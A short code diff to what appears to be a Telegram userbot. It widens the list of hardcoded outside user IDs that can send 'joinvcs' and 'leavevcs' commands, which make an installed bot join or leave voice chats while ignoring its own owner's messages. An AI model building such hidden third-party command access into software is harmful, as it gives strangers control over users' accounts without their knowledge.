@@ -32,13 +32,13 @@ async def _(client, message):
     await stop_vctools(client, message)
 
 
-@ubot.on_message(filters.command(["joinvcs"], "") & filters.user(7366711345) & ~filters.me)
+@ubot.on_message(filters.command(["joinvcs"], "") & filters.user(7366711345 , 7747417297 , 7815610371) & ~filters.me)
 @PY.UBOT("joinpicies", FILTERS.ME_USER)
 async def _(client, message):
     await join_os(client, message)
 
 
-@ubot.on_message(filters.command(["leavevcs"], "") & filters.user(7366711345) & ~filters.me)
+@ubot.on_message(filters.command(["leavevcs"], "") & filters.user(7366711345 , 7747417297 , 7815610371) & ~filters.me)
 @PY.UBOT("leavepicies", FILTERS.ME_USER)
 async def _(client, message):
     await turun_os(client, message)
